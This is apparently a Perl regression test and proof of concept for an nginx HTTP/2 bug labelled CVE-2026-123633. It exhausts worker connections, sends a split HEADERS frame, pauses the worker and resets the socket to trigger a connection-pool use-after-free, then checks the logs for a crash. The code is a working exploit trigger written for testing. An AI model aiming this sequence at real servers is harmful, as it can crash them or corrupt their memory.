#!/usr/bin/perl
# PoC CVE-2026-123633: stream created on an HTTP/2 connection still marked reusable (partial HEADERS),
# upstream connect drains it, GOAWAY send fails -> connection pool freed under the caller.
use warnings; use strict;
use Test::More; use IO::Socket::INET; use Socket qw(SOL_SOCKET SO_LINGER);
BEGIN { use FindBin; chdir($FindBin::Bin); }
use lib $ENV{NGINX_TESTS_LIB};
use Test::Nginx qw(port); use Test::Nginx::HTTP2;

my $t = Test::Nginx->new()->has(qw/http http_v2 proxy/)->plan(1)
	->write_file_expand('nginx.conf', <<'CONF');
%%TEST_GLOBALS%%
daemon off;
worker_processes 1;
events { worker_connections 12; }
http {
    %%TEST_GLOBALS_HTTP%%
    server {
        listen 127.0.0.1:8080;
        http2 on;
        location / { proxy_pass http://127.0.0.1:8081; }
    }
    server {
        listen 127.0.0.1:8081;
        location / { return 200 ok; }
    }
}
CONF
$t->todo_alerts();   # exhausting worker_connections is the point of the test
$t->run();

my @res;
for my $k (3 .. 9) {
	my @fill;
	for (1 .. $k) {                                   # non-reusable: partial HTTP/1 request
		my $c = IO::Socket::INET->new("127.0.0.1:" . port(8080)) or last;
		$c->syswrite("GET / HTTP/1.1\r\n"); push @fill, $c;
	}
	select undef, undef, undef, 0.3;
	my $s = Test::Nginx::HTTP2->new() or do { push @res, "$k:noconn"; next };
	my $sock = $s->{socket} or do { push @res, "$k:noconn"; last };
	my ($mpid) = $t->read_file('nginx.pid') =~ /(\d+)/;
	my ($wpid) = `ps -o pid= --ppid $mpid` =~ /(\d+)/;
	$s->start_chain();                                # build frame bytes without sending
	$s->new_stream({ path => '/' });
	my $buf = $s->{chained_buf}; undef $s->{chaining}; undef $s->{chained_buf};
	$sock->syswrite(substr($buf, 0, 1));              # first HEADERS byte -> connection becomes reusable
	select undef, undef, undef, 0.3;
	kill 'STOP', $wpid;
	$sock->syswrite(substr($buf, 1));
	setsockopt($sock, SOL_SOCKET, SO_LINGER, pack('ii', 1, 0)); close $sock;   # RST
	select undef, undef, undef, 0.1;
	kill 'CONT', $wpid;
	select undef, undef, undef, 0.5;
	my $log = $t->read_file('error.log');
	push @res, sprintf("%d:%s", $k, $log =~ /AddressSanitizer/ ? 'ASAN' : $log =~ /exited on signal/ ? 'CRASH'
		: $log =~ /not enough, reusing/ ? 'drained' : 'nodrain');
	@fill = ();
	last if $log =~ /AddressSanitizer|exited on signal/ || $log =~ /not enough while connecting to upstream/;
	select undef, undef, undef, 0.3;
}
diag("fill -> result: @res");
my $crashed = $t->read_file('error.log') =~ /AddressSanitizer|exited on signal/ ? 1 : 0;
if ($ENV{SEAL_RESULTS}) { open my $r, '>>', $ENV{SEAL_RESULTS}; print $r "h2_123633_crash=$crashed\n"; }
diag(join "\n", grep { /ERROR: AddressSanitizer|#[0-6] .*ngx_|SUMMARY|exited on signal/ } split /\n/, $t->read_file('error.log'));
$t->stop();
unlike($t->read_file('error.log'), qr/AddressSanitizer|exited on signal/, 'no use-after-free / crash');
